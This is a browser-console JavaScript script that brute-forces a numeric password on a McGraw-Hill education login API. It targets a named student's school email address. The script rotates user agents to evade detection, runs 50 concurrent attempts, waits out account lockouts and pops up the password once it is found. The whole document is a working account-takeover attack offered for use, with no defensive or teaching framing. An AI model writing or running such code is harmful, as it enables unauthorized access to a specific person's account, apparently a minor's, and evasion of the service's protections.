(() => {
    const USERNAME = "torres.a6@stu.janesville.k12.wi.us";
    const URL = "https://my-api.mheducation.com/api/login";
    const TOTAL = 100000000;
    let found = false;
    let tried = 0;
    const start = performance.now();
    const agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
    ];

    console.clear();
    console.log("🚀 STEALTH MODE — DODGING LOCKOUTS 🚀");

    const pad = n => n.toString().padStart(8, '0');

    const tryPin = async (num) => {
        if (found) return;
        const pin = pad(num);
        const agent = agents[Math.floor(Math.random() * agents.length)];
        try {
            const res = await fetch(URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "User-Agent": agent
                },
                body: JSON.stringify({ username: USERNAME, password: pin }),
                credentials: "include"
            });
            tried++;
            const json = await res.json();

            if (res.status === 200) {
                found = true;
                console.log(`\n🎯 PASSWORD FOUND: ${pin} 🎯\nTried ${tried.toLocaleString()} in ${(performance.now()-start)/1000}s`);
                alert(`PASSWORD = ${pin}`);
                return;
            } else if (res.status === 403 && json.errorCode === "ERRORCODE20") {
                console.log(`\n⚠️ Account locked at ${pin} — pausing 5 mins...`);
                await new Promise(r => setTimeout(r, 300000));
                return tryPin(num); 

            }
        } catch(e) {}

        if (tried % 2000 === 0) {
            const secs = (performance.now()-start)/1000;
            console.log(`Tried ${tried.toLocaleString()} | ${(tried/secs).toFixed(0)}/sec | ${((tried/TOTAL)*100).toFixed(4)}%`);
        }
    };

    const workers = 50; 

    let i = 0;
    const run = async () => {
        while (i < TOTAL && !found) {
            const promises = [];
            for (let j = 0; j < workers && i < TOTAL; j++) {
                promises.push(tryPin(i++));
                await new Promise(r => setTimeout(r, 10)); 

            }
            await Promise.allSettled(promises);
        }
    };
    run();
})();
